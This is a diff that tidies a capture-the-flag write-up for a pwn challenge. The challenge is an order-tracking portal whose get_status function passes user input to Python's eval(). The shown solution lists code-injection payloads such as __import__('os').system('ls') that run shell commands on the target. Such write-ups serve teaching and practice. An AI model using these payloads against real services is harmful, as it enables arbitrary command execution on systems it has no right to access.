@@ -1,10 +1,10 @@
 
 ## Challenge 
 
-**Category:  pwn
+**Category:**  pwn
 
 Starting off with a bag (pop)! I ordered a bunch of Valentine's Day-themed balloons, and I'm so excited about them! Here's the portal I use to track my order.
-Look for "valentine.txt."
+Look for "valentine.txt"
 **Author:** Manav (0xmmalik)
 `nc 0.cloud.chals.io 34293`
 
@@ -102,7 +102,7 @@ str(42+42)
 
 Tracking number not found!
 ```
-Whoops, looks like get_status is using the dnagerous eval() function to check the numbers. We should be able to force it to execute our own arbitrary code.
+Whoops, looks like get_status is using the dangerous eval() function to check the numbers. We should be able to force it to execute our own arbitrary code.
 
 ## Solution
 
@@ -113,12 +113,9 @@ Because eval() is being used, we can force it to import os and execute shell com
 
 (import('os').system('ls'))
 
-
 "__import__('os').system('ls')"
 
-
 "__import__('os').system('ls')"
-
 
 (__import__('os').system('ls'))
 
